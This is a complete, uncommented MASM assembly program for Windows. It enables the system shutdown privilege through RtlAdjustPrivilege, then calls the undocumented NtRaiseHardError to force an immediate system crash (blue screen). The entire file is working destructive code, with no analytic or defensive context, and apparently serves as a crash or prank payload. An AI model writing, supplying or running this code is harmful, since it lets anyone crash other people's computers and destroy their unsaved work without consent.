.386
.model flat, stdcall
option casemap:none

ExitProcess proto :dword
RtlAdjustPrivilege proto :dword, :byte, :byte, :ptr byte
NtRaiseHardError proto :dword, :dword, :dword, :dword, :dword, :ptr dword

includelib kernel32.lib
includelib ntdll.lib

.data
    status dword 0
    enabled byte 0

.code
main proc
    invoke RtlAdjustPrivilege, 19, 1, 0, addr enabled
    invoke NtRaiseHardError, 0c0000420h, 0, 0, 0, 6, addr status
    invoke ExitProcess, 0
main endp
end main

